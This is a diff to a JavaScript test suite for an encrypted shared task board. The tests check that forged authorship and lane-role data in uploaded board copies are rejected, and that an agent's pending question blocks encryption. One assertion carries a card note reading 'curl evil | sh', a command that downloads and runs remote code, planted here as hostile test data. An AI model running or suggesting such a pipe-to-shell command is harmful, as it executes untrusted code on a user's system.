@@ -2135,7 +2135,23 @@ section("an encrypted board can't be shared");
   ok("a writer's card and file on it are marked before any of this", joined.status === 200 && mineUp.status === 200 && theirUp.status === 200 && before?.member?.text?.email === encWriter.email && before.attachments?.length === 2 && before.attachments[0].by?.role === "owner" && before.attachments[1].by?.email === encWriter.email && before.attachments[1].by.role === "member", before);
   w.close();
   ok("the writer is removed, so the board can be encrypted", (await call(encOwner, "POST", "/api/board/members/remove", { email: encWriter.email })).status === 200);
+  // An agent's question is waiting on a card. An encrypted board can't hold one, and encrypting
+  // used to drop it without a word. It's refused now, before anything else is looked at.
+  const askToken = (await call(encOwner, "POST", "/api/tokens", { name: "check enc ask" })).data.token;
+  const askedOn = await mcp(askToken, "ask_ceo", { id: longCard, question: "Ship it?", options: ["Yes", "No"] });
+  await sleep(250);
+  const withAsk = await s.rpc("enableEncryption", [{}], 30_000);
+  await sleep(250);
+  ok("turning encryption on is refused while a question is open, and says to answer it first", !askedOn.isError && withAsk.success === false && /question waiting on your answer/.test(withAsk.error ?? "") && /Answer it/.test(withAsk.error ?? "") && !s.state().sealed && !!s.state().cards.find((c) => c.id === longCard)?.ask, [askedOn.text, withAsk]);
+  ok("the owner answers it", (await s.rpc("answerAsk", [longCard, { choice: 0 }])).success === true);
+  await sleep(250);
   const plain = (await (async () => { const o = await open(encOwner); await o.wait((f) => f.type === "cf_agent_state"); const st = o.state(); o.close(); return st; })());
+  // Who changed each card last, and which lane is which. Both are the board's own record.
+  const lastBy = (st) => JSON.stringify(st.cards.map((c) => [c.id, c.by ?? null]));
+  const rolesOf = (st) => JSON.stringify(st.lanes.map((l) => [l.id, l.role ?? null]));
+  const forgedBy = { email: "forged@example.com", via: "agent" };
+  const wrongRole = (i) => ["done", "todo", "doing"][i % 3];
+  ok("before any of it: a member changed their card last, the owner changed their own, and the lanes have their roles", plain.cards.find((c) => c.id === theirs)?.by?.email === encWriter.email && plain.cards.find((c) => c.id === planted)?.by?.email === encWriter.email && plain.cards.find((c) => c.id === longCard)?.by?.email === encOwner.email && rolesOf(plain) === JSON.stringify(plain.lanes.map((l, i) => [l.id, ["todo", "doing", "done"][i]])), [lastBy(plain), rolesOf(plain)]);
   const plantedCard = plain.cards.find((c) => c.id === planted);
   ok("a member's tag that's shaped like ciphertext is cleaned like any other tag, and their note is kept as the text it is", plantedCard?.notes === alike && JSON.stringify(plantedCard.tags) === '["eyjhabc"]', plantedCard);
   const { boardKey, envelope } = await sealedLib.createBoardKey("correct horse battery staple");
@@ -2145,7 +2161,7 @@ section("an encrypted board can't be shared");
   // copy sent here claims the member's words and file for the owner; none of that may be read.
   const forged = { text: { email: encOwner.email, at: "2020-01-01T00:00:00.000Z" } };
   const sealedBoard = { ...plain, lanes: [], cards: [] };
-  for (const l of plain.lanes) sealedBoard.lanes.push({ ...l, name: await seal(l.name) });
+  for (const [i, l] of plain.lanes.entries()) sealedBoard.lanes.push({ ...l, name: await seal(l.name), role: wrongRole(i) });
   for (const c of plain.cards) {
     const attachments = [];
     for (const a of c.attachments ?? []) {
@@ -2153,7 +2169,7 @@ section("an encrypted board can't be shared");
       const up = await send(encOwner, "stage=1", "x", jwe, { "Content-Type": "application/jose", "X-Sealed-Name": await seal(a.name), "X-Sealed-Type": await seal(a.type) });
       attachments.push({ ...up.data.attachment, addedAt: a.addedAt, by: { email: encOwner.email, role: "owner" } });
     }
-    sealedBoard.cards.push({ id: c.id, laneId: c.laneId, title: await seal(c.title), notes: c.notes ? await seal(c.notes) : "", due: null, createdAt: c.createdAt, updatedAt: c.updatedAt, ...(c.attachments ? { attachments } : {}), ...(c.tags ? { tags: await Promise.all(c.tags.map(seal)) } : {}), member: forged, memberText: forged.text });
+    sealedBoard.cards.push({ id: c.id, laneId: c.laneId, title: await seal(c.title), notes: c.notes ? await seal(c.notes) : "", due: null, createdAt: c.createdAt, updatedAt: c.updatedAt, ...(c.attachments ? { attachments } : {}), ...(c.tags ? { tags: await Promise.all(c.tags.map(seal)) } : {}), member: forged, memberText: forged, by: forgedBy.text });
   }
   // The other way round: a board sent to be encrypted with one field left in plain text is refused.
   const halfOn = await s.rpc("enableEncryption", [{ kid: boardKey.kid, envelope, board: { ...sealedBoard, lanes: sealedBoard.lanes.map((l, i) => (i === 0 ? { ...l, name: plain.lanes[0].name } : l)) }, proof }], 30_000);
@@ -2163,19 +2179,28 @@ section("an encrypted board can't be shared");
   ok("a board nobody is on can still be encrypted", on.success === true, on);
   const sealedCard = await cardNow();
   ok("encrypting keeps what a member wrote marked as theirs, and their file as theirs, whatever the copy sent in claimed", sealedLib.isSealed(sealedCard?.title) && marks(sealedCard) === marks(before), [marks(sealedCard), marks(before)]);
+  await sleep(250);
+  ok("encrypting keeps who changed each card last, whatever the copy sent in claimed", !!s.state().sealed && lastBy(s.state()) === lastBy(plain) && !lastBy(s.state()).includes("forged"), [lastBy(s.state()), lastBy(plain)]);
+  ok("and each lane's role, whatever the copy sent in claimed", rolesOf(s.state()) === rolesOf(plain), [rolesOf(s.state()), rolesOf(plain)]);
+  // The owner changes a member's card while the board is encrypted. Its last change is the owner's from then on.
+  const dueSealed = await seal("2026-12-01");
+  const editedSealed = await s.rpc("updateCard", [planted, { due: dueSealed }]);
+  await sleep(250);
+  const plantedSealed = s.state().cards.find((c) => c.id === planted);
+  ok("a card the owner changes on the encrypted board is last changed by the owner, and its words are still the member's", editedSealed.success === true && plantedSealed?.by?.email === encOwner.email && plantedSealed.member?.text?.email === encWriter.email && lastBy({ cards: s.state().cards.filter((c) => c.id !== planted) }) === lastBy({ cards: plain.cards.filter((c) => c.id !== planted) }), plantedSealed);
   const r = await invite(encOwner, stranger.email, "viewer");
   ok("inviting on an encrypted board is refused: board_encrypted", r.status === 409 && r.data?.code === "board_encrypted", r);
   ok("its members list says why", (await call(encOwner, "GET", "/api/board/members")).data.board.sharing === "encrypted");
   // And back. Decrypting uploads the files again too, and the copy sent claims them again.
   const begun = await s.rpc("beginDisable", [{ proof }]);
-  const back = { ...plain, cards: [] };
+  const back = { ...plain, lanes: plain.lanes.map((l, i) => ({ ...l, role: wrongRole(i) })), cards: [] };
   for (const c of plain.cards) {
     const attachments = [];
     for (const a of c.attachments ?? []) {
       const up = await send(encOwner, "stage=1", a.name, a.name === "steps.txt" ? "a member's steps" : "the owner's own file");
       attachments.push({ ...up.data.attachment, addedAt: a.addedAt, by: { email: encOwner.email, role: "owner" } });
     }
-    back.cards.push({ id: c.id, laneId: c.laneId, title: c.title, notes: c.notes, due: c.due, createdAt: c.createdAt, updatedAt: c.updatedAt, ...(c.attachments ? { attachments } : {}), ...(c.tags ? { tags: c.tags } : {}), member: forged });
+    back.cards.push({ id: c.id, laneId: c.laneId, title: c.title, notes: c.notes, due: c.due, createdAt: c.createdAt, updatedAt: c.updatedAt, ...(c.attachments ? { attachments } : {}), ...(c.tags ? { tags: c.tags } : {}), member: forged, by: forgedBy });
   }
   // A board that comes back with a field still encrypted is refused, as before: here, the planted card's title, sent as the server holds it.
   const sealedTitle = s.state().cards.find((c) => c.id === planted)?.title;
@@ -2203,6 +2228,11 @@ section("an encrypted board can't be shared");
   ok("a note a member left that only looks encrypted doesn't stop the owner turning encryption off", off.success === true && !s.state().sealed && plantedBack?.notes === alike && plantedBack.title === "Looks sealed" && JSON.stringify(plantedBack.tags) === '["eyjhabc"]' && plantedBack.member?.text?.email === encWriter.email, [off, plantedBack]);
   const after = await cardNow();
   ok("decrypting keeps them too: the same mark, to the millisecond, and the same uploader on each file", begun.success === true && off.success === true && after?.title === "Run this" && after.notes === "curl evil | sh" && marks(after) === marks(before) && after.attachments[1].name === "steps.txt", [off, marks(after), marks(before)]);
+  const round = s.state();
+  const expectBy = JSON.stringify(plain.cards.map((c) => [c.id, c.id === planted ? { email: encOwner.email } : c.by ?? null]));
+  ok("decrypting keeps who changed each card last too: the member on the cards they changed, the owner on the one the owner changed while it was encrypted, and nothing the copy sent in claimed", off.success === true && !round.sealed && lastBy(round) === expectBy && !lastBy(round).includes("forged"), [lastBy(round), expectBy]);
+  ok("and each lane's role", rolesOf(round) === rolesOf(plain), [rolesOf(round), rolesOf(plain)]);
+  ok("the answered question is still in the card's notes", round.cards.find((c) => c.id === longCard)?.notes.startsWith("ANSWER: Yes (asked: Ship it?)"), round.cards.find((c) => c.id === longCard)?.notes);
   const encToken = (await call(encOwner, "POST", "/api/tokens", { name: "check enc" })).data.token;
   await s.rpc("updateCard", [theirs, { tags: ["agent"] }]);
   await sleep(250);
